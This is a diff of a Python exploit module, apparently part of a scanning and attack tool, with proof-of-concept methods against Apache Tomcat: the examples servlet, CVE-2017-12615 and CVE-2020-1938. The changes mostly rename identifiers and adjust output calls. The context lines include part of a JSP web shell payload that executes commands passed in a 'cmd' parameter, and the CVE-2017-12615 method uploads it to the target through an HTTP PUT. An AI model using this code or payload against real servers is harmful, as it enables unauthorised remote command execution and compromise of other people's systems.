@@ -43,15 +43,15 @@ class ApacheTomcat():
             'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
             'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'
     def tomcat_examples(self):
-        appName = 'Apache Tomcat'
-        pocname = 'Examples File'
+        appName = 'ApacheTomcat'
+        pocname = 'tomcat_examples'
         path = '/examples/servlets/servlet/SessionExample'
         method = 'get'
         desc = 'Apache Tomcat: Examples File'
         info = "[url:"+self.url+path+" ]"
         payload = ''
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
 
@@ -67,8 +67,8 @@ class ApacheTomcat():
             return output.error_output(str(error))       
                 
     def cve_2017_12615(self):
-        appName = 'Apache Tomcat'
-        pocname = 'CVE-2017-12615'
+        appName = 'ApacheTomcat'
+        pocname = 'cve_2017_12615'
         name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
         path = '/'+name+'.jsp/'
         method = 'put'
@@ -77,7 +77,7 @@ class ApacheTomcat():
         payload1 = ":-)"
         payload2 = self.payload_cve_2017_12615
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
 
@@ -102,8 +102,8 @@ class ApacheTomcat():
             return output.error_output(str(error))
 
     def cve_2020_1938(self):
-        appName = 'Apache Tomcat'
-        pocname = 'CVE-2020-1938'
+        appName = 'ApacheTomcat'
+        pocname = 'cve_2020_1938'
         path = ''
         output_method = "ajp"
         desc = 'Apache Tomcat: CVE-2020-1938'
@@ -111,7 +111,7 @@ class ApacheTomcat():
         payload = ''
         headers = {'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'}
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
 
@@ -159,9 +159,11 @@ class ApacheTomcat():
             #print ((b"".join([d.data for d in self.data_res]).decode()))
             #return self.snd_hdrs_res, self.data_res
             #print (self.request)
+            if self.vuln != 'False':
+                print(request)
+                return
             if 'xml' in request:
                 return output.echo_success(method, info)
-                print(request)
             else:
                 return output.fail()
         except socket.timeout as error:
@@ -217,6 +219,8 @@ def check(**kwargs):
                 thread_list.append(kwargs['pool'].submit(getattr(ExpApacheTomcat, func)))
     #保存全局子线程列表
     GlobalVar.add_value('thread_list', thread_list)
+
+
 
 
 
